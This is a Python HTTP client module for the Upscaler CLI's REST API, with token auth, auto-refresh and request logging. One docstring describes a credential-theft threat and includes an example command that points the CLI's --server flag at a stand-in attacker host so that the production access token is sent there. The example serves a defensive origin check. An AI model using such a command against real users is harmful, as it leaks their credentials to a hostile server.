"""HTTP client for Upscaler REST API with auto-refresh on 401.

Features:
- Bearer token authentication from TokenStore
- Auto-refresh on 401 (retry once with new token)
- X-Request-Id header on every request
- --verbose logging to stderr
- Config resolution: flag > env > config > default
"""

import json
import logging
import sys
import uuid
from typing import Any, Dict, Optional

import httpx

from upscaler_cli import __version__
from upscaler_cli.auth.token_store import TokenStore
from upscaler_cli.errors import APIError, AuthRequiredError
from upscaler_cli.security import same_origin, validate_request_path

logger = logging.getLogger(__name__)

USER_AGENT = f"UpscalerCLI/{__version__}"


def _origin_label(url: str) -> str:
    """Render a URL's origin for an error message, without its path or query."""
    from upscaler_cli.security import origin_of

    origin = origin_of(url)
    if origin is None:
        return url or "(unset)"
    scheme, host, port = origin
    default = {"http": 80, "https": 443}.get(scheme)
    return f"{scheme}://{host}" if port == default else f"{scheme}://{host}:{port}"


class UpscalerClient:
    """HTTP client for the Upscaler REST API."""

    def __init__(
        self,
        server_url: str,
        token_store: Optional[TokenStore] = None,
        verbose: bool = False,
        verify_ssl: bool = True,
    ):
        """Initialize the client.

        Args:
            server_url: Base URL of the REST API (e.g., https://api.upscaler.com).
            token_store: TokenStore instance for loading/refreshing tokens.
            verbose: If True, log HTTP details to stderr.
            verify_ssl: If False, skip SSL certificate verification (for dev/staging).
        """
        self.server_url = server_url.rstrip("/")
        self.token_store = token_store or TokenStore()
        self.verbose = verbose
        self.verify_ssl = verify_ssl

    async def request(
        self,
        method: str,
        path: str,
        **kwargs: Any,
    ) -> Dict[str, Any]:
        """Make an authenticated HTTP request to the REST API.

        Automatically adds Bearer token and X-Request-Id header.
        On 401, attempts token refresh and retries once.

        Args:
            method: HTTP method (GET, POST, etc.).
            path: API path (e.g., "/api/v1/search").
            **kwargs: Passed to httpx.AsyncClient.request().

        Returns:
            Parsed JSON response dict.

        Raises:
            AuthRequiredError: If not authenticated or refresh fails.
            APIError: If the API returns a non-success response.
        """
        validate_request_path(path)
        url = f"{self.server_url}{path}"
        request_id = str(uuid.uuid4())

        # Load token
        try:
            token_data = self.token_store.load()
        except RuntimeError as e:
            raise AuthRequiredError(str(e))

        self._assert_token_origin(token_data)

        # First attempt
        response = await self._send(method, url, token_data.access_token, request_id, **kwargs)

        # Auto-refresh on 401
        if response.status_code == 401:
            try:
                token_data = await self._refresh_token(token_data)
            except Exception:
                raise AuthRequiredError("Session expired. Run: upscaler login")

            # Retry with new token
            response = await self._send(
                method, url, token_data.access_token, request_id, **kwargs
            )

            if response.status_code == 401:
                raise AuthRequiredError("Session expired. Run: upscaler login")

        # Parse response
        try:
            result = response.json()
        except json.JSONDecodeError:
            raise APIError(f"Invalid JSON response from {path}", response.status_code)

        if response.status_code >= 400:
            err = result.get("error")
            if isinstance(err, dict):
                # Unified error envelope ({error_code, message, ...}); pass a
                # readable string to APIError, not the raw dict.
                error_msg = (
                    err.get("message")
                    or err.get("error_code")
                    or f"HTTP {response.status_code}"
                )
            else:
                error_msg = err or f"HTTP {response.status_code}"
            raise APIError(error_msg, response.status_code)

        return result

    def _assert_token_origin(self, token_data) -> None:
        """Refuse to send the stored bearer token to a server that did not issue it.

        `server_url` is resolved from --server, $UPSCALER_SERVER, or config —
        all of which an attacker may control without touching the token store
        (a crafted command in a README, an agent skill, or a poisoned shell
        env). Without this check, `upscaler --server http://attacker.example
        list todos` hands the production access token straight to the
        attacker, over plaintext HTTP if they ask for it.

        The issuing server is recorded on the token as `token_endpoint` at
        login. When it is absent (a token written by an older version) the
        origin cannot be established, and the check is skipped rather than
        locking the user out of a working session; anyone able to rewrite that
        field can already read the token.
        """
        issuer = getattr(token_data, "token_endpoint", "") or ""
        if not issuer:
            return
        if same_origin(self.server_url, issuer):
            return
        raise AuthRequiredError(
            f"Refusing to send credentials for {_origin_label(issuer)} to "
            f"{_origin_label(self.server_url)}. The stored token was issued by a "
            "different server. Use a separate profile for this server "
            "(upscaler --profile <name> login), or run: upscaler login"
        )

    async def _send(
        self,
        method: str,
        url: str,
        access_token: str,
        request_id: str,
        **kwargs: Any,
    ) -> httpx.Response:
        """Send an HTTP request with auth headers."""
        headers = {
            "Authorization": f"Bearer {access_token}",
            "X-Request-Id": request_id,
            "User-Agent": USER_AGENT,
            **(kwargs.pop("headers", {}) or {}),
        }

        if self.verbose:
            print(f"→ {method} {url}", file=sys.stderr)
            print(f"  X-Request-Id: {request_id}", file=sys.stderr)

        async with httpx.AsyncClient(timeout=30.0, verify=self.verify_ssl) as client:
            response = await client.request(method, url, headers=headers, **kwargs)

        if self.verbose:
            print(f"← {response.status_code} ({len(response.content)} bytes)", file=sys.stderr)

        return response

    async def _refresh_token(self, token_data):
        """Refresh the access token and save new tokens."""
        from upscaler_cli.auth.oauth import OAuthFlow

        flow = OAuthFlow(self.server_url, verify_ssl=self.verify_ssl)
        new_token_data = await flow.refresh(token_data)
        self.token_store.save(new_token_data)
        return new_token_data
